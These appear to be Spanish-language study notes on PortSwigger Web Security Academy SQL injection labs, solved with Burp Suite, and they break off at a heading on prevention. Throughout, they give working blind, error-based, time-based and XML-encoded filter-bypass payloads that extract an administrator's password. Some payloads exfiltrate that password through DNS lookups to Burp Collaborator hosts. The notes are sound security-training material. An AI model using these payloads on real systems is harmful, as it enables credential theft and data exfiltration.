*   **Qué es:** Es el cerebro organizador y el mapa analítico de Burp Suite.
*   **Para qué sirve:** Sirve para definir explícitamente cuál es nuestro objetivo de ataque (el *Scope* o Alcance) y organizar las peticiones de ese dominio en forma de árbol de directorios (*Site Map*), separándolas del tráfico basura del resto del sistema.
*   **Cómo lo configuramos:** 
    1. Vamos a la pestaña `Target` -> subpestaña `Scope`.
    2. Activamos la casilla `Use advanced scope control`.
    3. En el recuadro `Include in scope`, hacemos clic en `Add`.
    4. En la casilla `Host or IP`, añadimos una expresión regular para que acepte cualquier laboratorio de PortSwigger automáticamente sin importar si cambia el subdominio: `.*\.web-security-academy\.net`
    5. Hacemos clic en `Ok`.

##### 🔍 Filter (Filtro Visual)
*   **Qué es:** Es una capa o "máscara" de visualización en tiempo real instalada sobre el historial.
*   **Para qué sirve:** Sirve para ocultar visualmente de nuestra pantalla todo el tráfico que Burp Suite sigue recolectando en segundo plano, permitiéndonos ver **únicamente** las peticiones que pertenecen al objetivo que definimos previamente en *Target*. Evita que perdamos de vista nuestros ataques entre miles de líneas de telemetría de Google.
*   **Cómo lo configuramos y dónde está:**
    1. Se encuentra en la pestaña `Proxy` -> subpestaña `HTTP history`.
    2. Hacemos clic sobre la **barra rectangular gris** que está justo encima de la tabla de peticiones.
    3. En el panel desplegable que se abre, marcamos la primera casilla de la esquina superior izquierda llamada: `Show only in-scope items` (Mostrar solo elementos del alcance).
    4. Hacemos clic fuera del panel para cerrarlo. La pantalla se actualizará de forma dinámica mostrando solo nuestro objetivo.




### LAB 9 Blind SQL injection with conditional responses

Este laboratorio contiene una vulnerabilidad de inyección SQL ciega (blind SQL injection). La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.

Los resultados de la consulta SQL no se devuelven y no se muestran mensajes de error. Sin embargo, la aplicación incluye un mensaje de **"Welcome back"** en la página si la consulta devuelve alguna fila.

La base de datos contiene una tabla diferente llamada **`users`**, con columnas llamadas **`username`** y **`password`**. Es necesario explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del usuario **`administrator`**.

Para resolver el laboratorio, inicia sesión como el usuario administrator.

**Respuesta**

En `Burp Suite` lo primero que hacemos es configurar `Target` y `Filter`.

Interceptamos la petición y la enviamos a `Repeter`.

![[Pasted image 20260923095001.png]]
Aquí podemos ver la información de la `Cookie`.

Vamos a empezar a hacer las comprobaciones, lo primero que debemos hacer es ver si existe esa vulnerabilidad que no dicen en el enunciado.

- Como vemos en la captura, vemos que hay un `TrackingId` por lo que en el `Backend` nos imaginamos que habrá una consulta parecida a esta:

`select trackingId from tracking_table where trackingId = 'gndOvqwaSoiIrflK'`

Si esto se cumple entonces nos devolverá `Wellcome back`.

![[Pasted image 20260923101631.png]]

- Probamos a cambiar el `trackingID` para ver si no nos devuelve `Wellcome Back`.
![[Pasted image 20260923101707.png]]

Vemos que hay 0 coincidencias.

- Ahora probamos con instrucciones lógicas:

`' and 1=1--` 
Nos devuelve `Wellcome back!`

>[!Importante]
>Recuerda darle a `CTRL + U` para poner la instrucción en formato que la web página pueda entender.
>
>El formato es **URL Encoding** (también conocido como **Codificación por porcentaje** o _Percent-encoding_).

`' and 1=0--`
No nos devuelve `Wellcome back!

Con esto ya hemos comprobado que tiene una vulnerabilidad de `Blind SQLi`.

- El enunciado nos decía que tenemos una table `users`, vamos a comprobarlo.
(Es como sustituir el `and 1=1`)

`'and (select 'x' from users LIMIT 1)='x'--`

La explicación de esta sentencia es que la `x` es un valor que se le asigna a cualquier valor que se encuentre en la tabla `users` y se compara con `x`.

Se limita a un resultado para poder se pueda cumplir la comparación de un resultado con otro, de `x` con `x`, no de `x x x ...` con `x`, ya que sino daría un error.

Así comprobamos si de verdad existe esa tabla, ya que si se muestra `Welcome back!` significa que al menos existe un resultado en esa tabla.

Comprobamos que nos devuelve `Welcome back!` por lo que ==si existe la tabla `users`.

- El enunciado también nos dice que existen las columnas `username` y `password` en la tabla `users`, vamos a comprobarlo (aplica lo mismo para `password`).

`' and (select username from users LIMIT 1) is not null --`

Comprobamos que nos devuelve `Welcome back!` por lo que ==si existe la columna `username`.

- Ahora tenemos que ver si comprobar si `administrador` existe en la tabla `users`.

`'and (select username from users where username = 'administrator')='administrator'--`

Comprobamos que nos devuelve `Welcome back!` por lo que ==si existe el `username` `administrator`.

- Ahora lo que vamos a hacer es medir la longitud de la contraseña, para eso haremos uso del operador `LENGTH`.

`'and (select 'a' from users where username = 'administrator'and LENGTH(password)=1)='a'--`

Esto lo podemos hacer probando manualmente o de manera automatizada.

**Para hacerlo de manera automática lo enviamos al `Intruder`.**

![[Pasted image 20260923125944.png]]

El ataque será `Sniper`.

En la parte de `Payloads` hacemos lo siguiente:

![[Pasted image 20260923121133.png]]

Le damos a `Start attack` para empezar el ataque.

![[Pasted image 20260923130131.png]]

Obtenemos que ==el tamaño de la contraseña es de 20 caracteres.

- Ahora tenemos que descubrir que caracteres son, para ello vamos a utilizar el método `SUBSTRING(texto_de_extraccio, posicion_donde_empieza, cuantos_caracteres)`.

`' and (select substring(password,1,1) from users where username = 'administrator')='x'--`

`x` representa el valor del carácter que queremos obtener que será una letra, un número o un carácter especial. (En este caso solo seleccionaremos letras minúsculas y números).

Esto de forma manual es tedioso por lo que se debe hacer mediante `Intruder`o mediante un `script`.

![[Pasted image 20260923132624.png]]

![[Pasted image 20260923132711.png]]

Obtenemos que ==el primer carácter de la contraseña es un `6`.

Esto probarlo cada carácter hasta tener los 20 sería una perdida de tiempo por lo que se recomienda usar un script o 

![[Pasted image 20260923133329.png]]

Añadimos ahora la variable de la posición de cada carácter para que se vaya aumentando de 1-20 para que se prueben todas las letras y números en las 20 posiciones.

Configuramos el `payload` primero para esta variable:

![[Pasted image 20260923133636.png]]

Ahora vamos con la segunda variable que es exactamente igual a como la configuramos anteriormente:

![[Pasted image 20260923133841.png]]

Le damos a `Start attack` y cuando acabe tendremos que ir revisando los resultados para ir juntando las letras según las posiciones que nos han dado, lo mejor es ordenarlo por `Length`para así tener todos los hallazgos juntos.

Obtenemos la contraseña del administrador.

Solo queda iniciar sesión con ella y ver que es correcta.

###  <u>Inyección SQL basada en errores (Error-based SQL injection)</u>

La **inyección SQL basada en errores** se refiere a los casos en los que se pueden utilizar los mensajes de error para extraer o inferir datos sensibles de la base de datos, incluso en contextos ciegos (*blind*). Las posibilidades dependen de la configuración de la base de datos y de los tipos de errores que se puedan provocar:

* **Inducción de respuestas específicas:** Es posible que pueda inducir a la aplicación a devolver una respuesta de error específica basada en el resultado de una expresión booleana. Puede explotar esto de la misma manera que las respuestas condicionales que vimos en la sección anterior. Para obtener más información, consulte *Explotación de la inyección SQL ciega mediante la activación de errores condicionales*.

* **Activación de mensajes detallados:** Es posible que pueda activar mensajes de error que muestren los datos devueltos por la consulta. Esto convierte eficazmente las vulnerabilidades de inyección SQL que de otro modo serían ciegas en vulnerabilidades visibles. Para obtener más información, consulte *Extracción de datos sensibles a través de mensajes de error SQL detallados*.

### Explotación de la inyección SQL ciega mediante la activación de errores condicionales

Algunas aplicaciones realizan consultas SQL pero su comportamiento no cambia, independientemente de si la consulta devuelve datos o no. La técnica de la sección anterior no funcionará, ya que inyectar diferentes condiciones booleanas no altera las respuestas de la aplicación.

A menudo es posible inducir a la aplicación a devolver una respuesta diferente dependiendo de si se produce un error SQL. Puede modificar la consulta para que provoque un error en la base de datos solo si la condición es verdadera. Muy a menudo, un error no manejado lanzado por la base de datos provoca alguna diferencia en la respuesta de la aplicación, como un mensaje de error. Esto le permite inferir la veracidad de la condición inyectada.

**Uso de `CASE`:**

`' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`

Esto es como el `if/else` en programación, pero se usa este formato:

`CASE WHEN` (condición) `THEN` (si se cumple la condición) `ELSE` (sino se cumple la condición) `END`.

> [!WARNING]
> Usar **`1/0`** es muy problemático en bases de datos porque **tiene que ser analizado por la base de datos en el tiempo de ejecución** sino no podremos usarla como queremos. Por ello se utilizan trucos de sintaxis dependiendo de la base de datos que queremos utilizar.

Otros ejemplos:

Este bloque es como el `switch` en programación. (`AS`es para poner un alias a la columna donde se van a mostrar los datos para que estén de forma ordenada)

```
SELECT producto, precio,
    CASE estado_stock
        WHEN 1 THEN 'Disponible'
        WHEN 2 THEN 'Agotado'
        WHEN 3 THEN 'Bajo pedido'
        ELSE 'Desconocido'
    END AS estado
FROM inventario;
```

Este bloque es para decir el nombre, la edad y decir si es menor o no.

```
SELECT nombre, edad,
    CASE 
        WHEN edad < 18 THEN 'Menor de edad'
        WHEN edad BETWEEN 18 AND 65 THEN 'Adulto'
        ELSE 'Adulto mayor'
    END AS categoria_edad
FROM usuarios;
```


En ciberseguridad, una técnica que nos interesa es la siguiente:

`' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

> [!NOTE]
> Existen diferentes formas de provocar errores condicionales, y diferentes técnicas funcionan mejor en distintos tipos de bases de datos. Para más detalles, consulta la guía de referencia de inyección SQL.


### LAB 10 Blind SQL injection with conditional errors

Este laboratorio contiene una vulnerabilidad de inyección SQL ciega (Blind SQL injection). La aplicación utiliza una cookie de seguimiento (tracking cookie) para análisis de datos y ejecuta una consulta SQL que incluye el valor de dicha cookie.

Los resultados de la consulta SQL no se devuelven en la pantalla, y la aplicación no responde de manera diferente si la consulta devuelve o no filas. Sin embargo, si la consulta SQL provoca un error, la aplicación devuelve un mensaje de error personalizado.

La base de datos contiene una tabla diferente llamada `users` (usuarios), con columnas llamadas `username` (nombre de usuario) y `password` (contraseña). Debes explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del usuario `administrator`.

Para resolver el laboratorio, inicia sesión como el usuario `administrator`.

---
**Respuesta**

La consulta que se enviará a la base de datos es esta:

`SELECT lo_que_sea FROM tracking_table WHERE TrackingId ='xyz'`

Nosotros podemos modificar lo que le llegará a la base de datos por lo que vamos a probar a poner una comilla para que quede una suelta. Esto hará que no encuentre a ese usuario y podemos ver si nos da un error de algún tipo.

**1. Ver si es vulnerable**

- Ponemos `'` y vemos que se produce un error interno del servidor.
- Ponemos `''` para que no haya fallo y vemos que se nos muestra la página.

Con esto demostramos que hay una vulnerabilidad porque la aplicación reacciona de forma distinta ante un error de sintaxis SQL (causado por la comilla suelta), lo que confirma que nuestro input se está inyectando directamente en el motor de la base de datos.

**2. Ejecutar una consulta de prueba**

Lo siguiente que vamos a probar es si podemos hacer consultas, para ello es necesario concatenar con el texto, por dos motivos:

Para que no lo tome como texto.

Para que no lo tome como una consulta que va aparte del texto que no tiene ninguna lógica que este en ese lugar.

Al concatenar el texto con una consulta `SELECT` obligamos a que la base de datos resuelva esa expresión antes de concatenarla.

`xyz'|| (SELECT '' FROM dual) || '`

Al poner esto el servidor lo pondrá entre comillas y este será el resultado en el servidor:

`'xyz' || (select '' from dual) || ''`

Como vemos las comillas están todas cerradas por lo que debe funcionar, si todo va bien debería mostrarnos la página sin problema.

**3. Comprobamos si existe la table `users`, la columna `username` y el usuario `administrator`**

>[!Warning] Atención
En Oracle, cuando metes un `SELECT` dentro de una concatenación `||`, la subconsulta **solo puede devolver una fila**. Si la tabla tiene más de un registro, es obligatorio usar `WHERE rownum=1` para limitar el resultado y evitar el Internal Server Error.
(Anteriormente no nos dio error porque dual solo tiene una fila).

>[!Note]
`rownum` es como `limit` en otras bases de datos.
Poner algo diferente a `rownum=1` no nos dará ninguna información ya que cualquier número que sea mayor a 1 será falso y devolverá un resultado vacío.
>
>Su lógica es que la fila 1 no es la `x>1` entonces la descarta y pasa a la siguiente que vuelve a tomar el valor de 1 ya que la anterior fue descartada y así sucesivamente.

- Para comprobar si existe la tabla `users`:

`' || (select '' from users where rownum=1) || '`

- Para comprobar si existe la columna `username`:

`' || (select username from users where rownum=1) || '`

- Para comprobar si existe el usuario `administrator`:

En este caso no podemos hacer lo mismo ya que se trata de un dato y si no lo encuentra aún así cargará la página web, ya que no encuentra al usuario pero no ha ocurrido ningún error del sistema.

`' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username = 'administrator') || '`

>[!Warning] Advertencia
>En el `WHEN`se recomienda poner una igualdad y el `WHERE`ponerlo **al final** de la sentencia.
>
>El orden de ejecución sería primero el `WHERE`, se filtran los resultados y se aplica el `WHEN`.

Al hacer esta consulta nos dará un error del sistema si existe el usuario `administrator`, ya que se ejecutará la operación `1/0` y si no existe el usuario entonces el resultado a concatenar será `NULL` y se cargará la página sin problema.

**4. Obtener la longitud de la contraseña del administrador**

`' || (SELECT CASE WHEN (length(password)='x') THEN TO_CHAR(1/0) ELSE NULL END FROM users where username = 'administrator') || '`

![[Pasted image 20260924181205.png]]

 Mediante el `Intruder` creamos un ataque y vamos aumentando el valor de `x` hasta que coincida con el valor de la longitud de la contraseña, en ese caso pasará a mostrar un `Internal Server Error` ya que se cumplirá la condición.

El resultado en este caso es 20.

**5. Sacar la contraseña del administrador**

`' || (SELECT CASE WHEN (substr(password,1,1)='a') THEN TO_CHAR(1/0) ELSE NULL END FROM users where username = 'administrator') || '`

Aquí tenemos que cambiar el valor de la posición de la letra desde 1 hasta 20, que es el tamaño de la contraseña y a la vez ir probando con todos los caracteres a-z y 0-9 por cada posición.

Se puede hacer con un `script` en Python o mediante `Intruder` con `cluster bomb attack` (pero con la versión `community`es muy lento) o con `Sniper attack` y cambiando manualmente la posición de los caracteres (es más rápido).

### Extracción de datos confidenciales mediante mensajes de error SQL detallados (Verbose)

Una configuración incorrecta de la base de datos a veces puede dar lugar a mensajes de error detallados. Estos pueden proporcionar información que puede ser útil para un atacante. Por ejemplo, considera el siguiente mensaje de error, que ocurre tras inyectar una comilla simple en un parámetro `id`:

`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`

Esto muestra la consulta completa que la aplicación construyó utilizando nuestra entrada. Podemos ver que, en este caso, nos estamos inyectando dentro de una cadena de texto entrecomillada con comillas simples dentro de una sentencia `WHERE`. Esto hace que sea más fácil construir una consulta válida que contenga una carga útil (payload) maliciosa. Comentar el resto de la consulta evitaría que la comilla simple superflua rompa la sintaxis.

En ocasiones, es posible inducir a la aplicación para que genere un mensaje de error que contenga parte de los datos devueltos por la consulta. Esto transforma de manera efectiva una vulnerabilidad de inyección SQL que de otro modo sería ciega (blind) en una visible.

Puedes utilizar la función `CAST()` para lograr esto, la cual te permite convertir un tipo de dato en otro. Por ejemplo, imagina una consulta que contenga la siguiente sentencia:

`CAST((SELECT columna_de_ejemplo FROM tabla_de_ejemplo) AS int)`

A menudo, los datos que intentas leer son cadenas de texto (strings). Intentar convertir esto a un tipo de dato incompatible, como un `int`, puede provocar un error similar al siguiente:

`ERROR: invalid input syntax for type integer: "Example data"`

Este tipo de consulta también puede ser útil si un límite de caracteres te impide activar respuestas condicionales.

`CAST( expresión AS tipo_de_dato )`

>[!Warning] Atención
>El operador de concatenación `||` tiene prioridad de ejecución sobre la comparación `=`.
>Entonces se produce una comprobación de tipos y si se intenta comparar un `integer=text` dará un fallo.

### LAB 11: Inyección SQL basada en errores visibles

Este laboratorio contiene una vulnerabilidad de inyección SQL. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada. Los resultados de la consulta SQL no se devuelven.

La base de datos contiene una tabla diferente llamada`users`, con columnas llamadas `username` y `password`. Para resolver el laboratorio, encuentra una manera de filtrar la contraseña del usuario `administrator` y luego inicia sesión en su cuenta.

**Respuesta**

- Como la base de datos nos muestra donde está el fallo atacamos justo al dato que queremos, tenemos que hacer que falle en ese dato para obtener esa información.

Podemos ver quien es el primero en la lista de `username` con el siguiente comando:

` ' and 1= CAST((SELECT username FROM users limit 1) AS int)--`

Esto da como resultado `administrator`.

>[!Important] Importante, Fallo al usar `||`
>
>Si se intenta usar `||` no funcionará correctamente:
>
>` ' and 1= CAST((SELECT username FROM users limit 1) AS int) || '`
>
>La base de datos toma este resultado:
>
>` '' and 1= CAST((SELECT username FROM users limit 1) AS int) || ''`
>
>Al poner este pensé que se podía resolver de igual manera pero no se puede resolver porque antes de nada se produce una comparación implícita. El operador `||`tiene prioridad, por lo que compara el lado derecho con el izquierdo y se da cuenta de que no es posible comparar `integer=texto` y ahí acaba la ejecución.
>
>Al usar el comentario `--` primero se ejecuta la igualdad, donde se intenta comparar el `1` con un bloque `CAST`que es `AS INT`por lo que es un `int=int` por lo que continua la ejecución hasta el final hasta que se descubre que no es posible comparar a `1=administrador`.

- Ahora que sabemos que el usuario es `administrator` lo siguiente es averiguar su contraseña:

`' and 1=CAST((SELECT password from users limit 1) AS INT)--`

Con esto obtenemos la contraseña del administrador.

En este laboratorio hay que tener en cuenta el número de caracteres que se usan ya que hay un máximo establecido.

## Exploiting blind SQL injection by triggering time delays

Si la aplicación captura los errores de la base de datos cuando se ejecuta la consulta SQL y los gestiona de manera controlada, no habrá ninguna diferencia en la respuesta de la aplicación. Esto significa que la técnica anterior para inducir errores condicionales no funcionará.

En esta situación, a menudo es posible explotar la vulnerabilidad de inyección SQL ciega provocando retrasos de tiempo en función de si una condición inyectada es verdadera o falsa. Dado que las aplicaciones normalmente procesan las consultas SQL de forma síncrona, retrasar la ejecución de una consulta SQL también retrasa la respuesta HTTP. Esto le permite determinar la veracidad de la condición inyectada basándose en el tiempo necesario para recibir la respuesta HTTP.

Las técnicas para provocar un retraso de tiempo son específicas del tipo de base de datos que se esté utilizando. Por ejemplo, en Microsoft SQL Server, se puede utilizar lo siguiente para probar una condición y provocar un retraso en función de si la expresión es verdadera:

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

La primera de estas entradas no provoca un retraso, porque la condición 1=2 es falsa.
La segunda entrada provoca un retraso de 10 segundos, porque la condición 1=1 es verdadera.

Utilizando esta técnica, podemos recuperar datos probando un carácter a la vez:

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

>[!note]
>Existen varias formas de provocar retrasos de tiempo dentro de las consultas SQL, y se aplican diferentes técnicas en diferentes tipos de bases de datos. Para obtener más detalles, consulte la hoja de trucos de inyección SQL.

### LAB 12 Inyección SQL ciega con retrasos temporales y recuperación de información

Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.

Los resultados de la consulta SQL no se devuelven, y la aplicación no responde de manera diferente independientemente de si la consulta devuelve filas o provoca un error. Sin embargo, dado que la consulta se ejecuta de forma síncrona, es posible provocar retrasos de tiempo condicionales para inferir información.

La base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username` y `password`. Debe explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del usuario `administrator`.

Para resolver el laboratorio, inicie sesión como el usuario `administrator`.

**Respuesta**

>[!Note] Ten en cuenta
>
Todo lo que esta entre comillas es un texto y lo primero que hace la base de datos es coger toda la instrucción y meterla entre paréntesis, por lo que siempre debemos poner un paréntesis primero para que así se cierren y después meter la instrucción.
>
Poner la concatenación `||` es necesario para que lo tome como una única instrucción ya que no se pueden poner varias instrucciones seguidas.

La sentencia sería:

`' || (select case when (1=1) then pg_sleep(10) else pg_sleep(0) end)--`

Quedaría de esta forma donde primero se cierran las comillas y se concatena con la instrucción:

`'' || (select case when (1=1) then pg_sleep(10) else pg_sleep(0) end)--'`

- Con esto comprobamos que funciona la instrucción y que espera 10 segundos hasta mostrarnos la página web.

- Ahora debemos averiguar la longitud de la contraseña.

Podemos ponerlo con de dos maneras:

`' || (select case when (username='administrator' and length(password)=20) then pg_sleep(5) else pg_sleep(0) end from users)--`

o

`' || (select case when (length(password)=20) then pg_sleep(5) else pg_sleep(0)end from users where username='administrator')--`

Lo podemos hacer cambiando el numero de la longitud de la contraseña con `Intruder`, descubrimos que es 20.

- Lo siguiente es averiguar la contraseña:

`' || (select case when (substring(password,1,1)='a') then pg_sleep(5) else pg_sleep(0)end from users where username='administrator')--`

Esto lo podemos hacer con `cluster bomb` o con un `sniper attact`cambiando manualmente la posición.
## Explotación de Blind SQL Injection usando técnicas Out-of-Band (OAST)

Es posible que una aplicación realice la misma consulta SQL que en el ejemplo anterior, pero de forma **asíncrona**. La aplicación continúa procesando la solicitud del usuario en el hilo original y utiliza otro hilo secundario para ejecutar la consulta SQL que procesa la cookie de seguimiento. Aunque la consulta sigue siendo vulnerable a la inyección SQL, ninguna de las técnicas descritas hasta ahora (basadas en errores o en tiempo) funcionará. Esto se debe a que la respuesta de la aplicación no depende de que la consulta devuelva datos, de que ocurra un error de base de datos ni del tiempo que tarde en ejecutarse la consulta.

En esta situación, a menudo es posible explotar la vulnerabilidad de Blind SQL Injection provocando **interacciones de red fuera de banda (Out-of-Band)** hacia un sistema que tú controles. Estas interacciones se pueden activar en función de una condición inyectada para inferir la información carácter por carácter. O lo que es aún más útil: los datos se pueden **exfiltrar directamente** dentro de la propia interacción de red.

Para este propósito se pueden utilizar diversos protocolos de red, pero por lo general el más eficaz es **DNS** (Domain Name Service). Esto se debe a que muchas redes de producción permiten la salida libre de consultas DNS, ya que son esenciales para el funcionamiento normal de los sistemas.

La herramienta más fácil y confiable para utilizar técnicas fuera de banda (OAST) es **Burp Collaborator**. Este es un servidor que proporciona implementaciones personalizadas de varios servicios de red, incluyendo DNS. Te permite detectar cuándo ocurren interacciones de red como resultado del envío de payloads específicos a una aplicación vulnerable. Burp Suite Professional incluye un cliente integrado que está configurado de fábrica para funcionar con Burp Collaborator. Para obtener más información, consulta la documentación de Burp Collaborator.

Las técnicas para provocar una consulta DNS dependen del tipo de base de datos que se esté utilizando. Por ejemplo, la siguiente entrada en **Microsoft SQL Server** se puede utilizar para forzar una resolución DNS en un dominio específico:

```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

Esto hace que la base de datos realice una búsqueda para el siguiente dominio:

```text
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

Puedes utilizar Burp Collaborator para generar un subdominio único y consultar (*poll*) el servidor de Collaborator para confirmar en qué momento ocurren las búsquedas DNS.

>[!Note] Explicación resumida
>
Asíncrono es que realiza dos cosas a la vez, por un lado te envía la página directamente para que tu no esperes y por otro lado por ejemplo ejecuta `pg_sleep()` y se queda esperando ese tiempo, pero tu no te das cuenta porque recibes la página inmediatamente.
>
"Fuera de banda" significa que forzamos a la base de datos a comunicarse por **otro camino completamente distinto**: internet. Le ordenamos que salga a buscar una página web o un dominio que nos pertenece.
>
Para que la base de datos pueda hablar con el exterior, los servidores suelen tener cortafuegos (firewalls) muy estrictos que les prohíben navegar por internet de forma normal (HTTP).  
Sin embargo, los administradores casi siempre dejan abierto el **DNS**.

### Lab 13 Blind SQL injection with out-of-band interaction

Este laboratorio contiene una vulnerabilidad de **Blind SQL Injection** (Inyección SQL Ciega). La aplicación utiliza una cookie de seguimiento (*tracking cookie*) para análisis de datos y realiza una consulta SQL que incluye el valor de la cookie enviada.

La consulta SQL se ejecuta de forma **asíncrona** y no afecta en nada a la respuesta de la aplicación. Sin embargo, puedes provocar interacciones fuera de banda (out-of-band) hacia un dominio externo.

Para resolver el laboratorio, explota la vulnerabilidad de inyección SQL para **provocar una resolución DNS (DNS lookup)** hacia Burp Collaborator.

> [!NOTE] Nota
> Para evitar que la plataforma de la Academy se utilice para atacar a terceros, nuestro firewall bloquea las interacciones entre los laboratorios y sistemas externos arbitrarios. Para resolver el laboratorio, debes utilizar obligatoriamente el servidor público por defecto de **Burp Collaborator**.


**NO PODEMOS REALIZAR ESTE LABORATORIO POR NO TENER BURP SUITE PRO**

```sql
' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
```
Si por ejemplo es `Oracle` usaríamos esta sentencia, el dominio es el que nos asigna `Burp Suite Collaboration`.
![[Pasted image 20260927115704.png]]

Al enviar la petición y darle a `pull now`veremos que se ha realizado con éxito.

![[Pasted image 20260927115619.png]]

## Continuación: Explotación de Blind SQL Injection usando técnicas Out-of-Band (OAST)

Una vez confirmado que es posible provocar interacciones fuera de banda, puedes utilizar este canal para exfiltrar datos de la aplicación vulnerable. Por ejemplo:

```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

Esta entrada lee la contraseña del usuario `Administrator`, la concatena al principio de un subdominio único de Collaborator y provoca una resolución DNS. Esta búsqueda te permite ver la contraseña capturada directamente en el subdominio:

```text
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

Las técnicas fuera de banda (OAST) son una forma muy potente de detectar y explotar Blind SQL Injection debido a su alta probabilidad de éxito y a la capacidad de exfiltrar datos directamente dentro del propio canal fuera de banda. Por esta razón, las técnicas OAST suelen ser preferibles incluso en situaciones donde otras técnicas de explotación a ciegas sí funcionan.

> [!NOTE] Nota
> Existen diversas formas de provocar interacciones fuera de banda, y se aplican diferentes técnicas según el tipo de base de datos. Para más detalles, consulta la hoja de trucos de SQL injection (*SQL injection cheat sheet*).

### LAB 14 Blind SQL injection with out-of-band data exfiltration

Voy a poner los dos comandos juntos para compararlos fácilmente, primero pondré el que usamos para comprobar el ataque.

```sql
' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
```

Ahora al comando anterior le añadimos lo siguiente para obtener la contraseña del administrador:

```sql
' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
```

# Inyección SQL en diferentes contextos

En los laboratorios anteriores, utilizaste la cadena de consulta (*query string*) para inyectar tu payload SQL malicioso. Sin embargo, puedes realizar ataques de inyección SQL utilizando cualquier entrada controlable que la aplicación procese como una consulta SQL. Por ejemplo, algunos sitios web reciben datos en formato JSON o XML y los utilizan para consultar la base de datos.

Estos formatos diferentes pueden ofrecerte distintas formas de ofuscar los ataques que, de otro modo, serían bloqueados por WAFs (Firewalls de Aplicación Web) u otros mecanismos de defensa. Las implementaciones débiles a menudo buscan palabras clave comunes de inyección SQL dentro de la solicitud, por lo que es posible que puedas eludir estos filtros codificando o escapando caracteres en las palabras clave prohibidas. Por ejemplo, la siguiente inyección SQL basada en XML utiliza una secuencia de escape XML para codificar la letra "S" en la palabra SELECT:

```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

Esto se decodificará en el lado del servidor antes de ser enviado al intérprete de SQL.


### Lab 15 SQL injection with filter bypass via XML encoding

Este laboratorio contiene una vulnerabilidad de Inyección SQL en su función de comprobación de stock (*stock check*). Los resultados de la consulta se devuelven directamente en la respuesta de la aplicación, por lo que puedes utilizar un ataque `UNION` para recuperar datos de otras tablas.

La base de datos contiene una tabla llamada `users`, la cual almacena los nombres de usuario (*`usernames`*) y las contraseñas (*`passwords`*) de los usuarios registrados. Para resolver el laboratorio, realiza un ataque de inyección SQL que te permita recuperar las credenciales del usuario administrador (``administrator``) y luego inicia sesión en su cuenta.

**Respuesta**

En este laboratorio entramos a la página y vamos a un producto cualquiera para ver el `stock` pudiendo comprobarlo pulsando un botón `check stock`.

Al pulsar ese botón capturamos la petición y vemos el código `XML` el cuál modificamos:

`union select password from users where username='administrator'`

![[Pasted image 20260927125553.png]]

![[Pasted image 20260927125607.png]]

Ofuscamos el comando para que no se detecte el ataque

![[Pasted image 20260927125632.png]]

![[Pasted image 20260927125720.png]]

Podemos ver la contraseña.

# Inyección SQL de Segundo Orden (Second-Order SQL Injection)

La **inyección SQL de primer orden** ocurre cuando la aplicación procesa la entrada del usuario directamente desde una solicitud HTTP e incorpora dicha entrada en una consulta SQL de forma insegura.

La **inyección SQL de segundo orden** (también conocida como **Inyección SQL almacenada**) ocurre cuando la aplicación toma la entrada del usuario de una solicitud HTTP y la **almacena para su uso futuro**. Por lo general, esto se hace guardando la entrada en una base de datos, pero en el momento exacto en que se guardan los datos **no ocurre ninguna vulnerabilidad**. 

Más tarde, al procesar una solicitud HTTP diferente, la aplicación recupera esos datos almacenados y los incorpora en una nueva consulta SQL de forma insegura.

Este tipo de inyección suele ocurrir en situaciones donde los desarrolladores son conscientes de las vulnerabilidades de inyección SQL y, por lo tanto, protegen de forma segura la inserción inicial de los datos en la base de datos (por ejemplo, usando consultas preparadas). Sin embargo, cuando esos datos se procesan más adelante, el sistema los considera "seguros" de forma errónea basándose en que ya estaban guardados dentro de la propia base de datos de confianza. En ese punto, los datos se manipulan de forma insegura porque el desarrollador confía ciegamente en ellos.

>[!Note] Explicación con ejemplo
>Te registras con nombre de usuario `admin'--`
>Te guarda de forma exitosa en la base de datos.
>Le das a cambiar contraseña y la web lo mete en una consulta como esta:
>
`UPDATE users SET password = 'nueva_password' WHERE username = 'admin'--'`
>
>¡Boom! Los guiones `--` comentan el final de la consulta. La base de datos acabará cambiando la contraseña del usuario `admin` real, y no la tuya.

## Cómo prevenir la Inyección SQL

